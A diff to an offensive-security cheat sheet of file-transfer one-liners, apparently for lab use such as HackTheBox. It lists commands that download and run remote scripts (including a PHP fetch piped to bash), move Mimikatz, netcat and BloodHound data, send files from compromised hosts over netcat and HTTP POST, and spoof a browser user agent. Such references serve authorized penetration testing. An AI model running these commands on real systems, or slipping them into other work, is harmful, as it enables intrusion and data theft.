@@ -1,31 +1,10 @@
-# File Transfert
+# File Transfert - 
 
 % linux, windows
-
-
-## Download a file with PowerShell
-```
-Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
-```
-
-## Execute a file in memory using PowerShell
-```
-IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
-```
-
-## Upload a file with PowerShell
-```
-Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
-```
 
 ## Download a file using Bitsadmin
 ```
 bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
-```
-
-## Download a file using Certutil
-```
-certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
 ```
 
 ## Download a file using Wget
@@ -53,10 +32,6 @@ scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
 scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
 ```
 
-## Invoke-WebRequest using a Chrome User Agent
-```
-Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
-```
 ## Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.
 ```
 python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/
@@ -70,3 +45,78 @@ python3 smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support sha
 ```
 Cmd > net use Z: \\10.10.14.153\share /u:snovvcrash 'Passw0rd!'
 ```
+
+## Python2 - urlretrieve
+```
+python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<file>")'
+```
+## Python3 - urlretrieve
+```
+python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<file>")'
+```
+
+## PHP - download file file_get_content()
+```markdown
+php -r '$file = file_get_contents("<URL>"); file_put_contents("<file>",$file);'
+```
+
+## PHP - download file fopen()
+```markdown
+php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<file>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+```
+
+## PHP - Download and pipe it to bash
+```
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+
+## Ruby - download a file
+```markdown
+ruby -e 'require "net/http"; File.write("<file>", Net::HTTP.get(URI.parse("<URL>")))'
+```
+## Python - upload/POST a file
+```
+python3 -c 'import requests;requests.post("http://<IP>:<PORT>/upload",files={"files":open("<file>","rb")})'
+```
+
+## nc - send file to compomised host
+```
+nc -q 0 <IP> <PORT> < <file>
+```
+
+## nc - send file to compomised host
+```
+nc -l -p <PORT> -q 0 < <file>
+```
+
+## netcat - send file to compomised host
+```
+ncat --send-only  <IP> <PORT> < <file>
+```
+
+## nc - recv file from listening port
+```
+nc -l -p <PORT> > <file>
+```
+
+## netcat - recv file from listening port
+```
+netcat -l -p <PORT> --recv-only > <file>
+```
+
+## certreq - upload/POST file
+```markdown
+certreq.exe -Post -config <URL> <output_file>
+```
+
+## Bitstransfert - file donwload
+```markdown
+Import-Module bitstransfer; Start-BitsTransfer -Source "<URL>" -Destination "<output_file>"
+```
+
+## chrome user agent - download file
+```
+PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+PS C:\htb> Invoke-WebRequest http://<IP>:<PORT>/<file> -UserAgent $UserAgent -OutFile "<outfile>"
+
+`
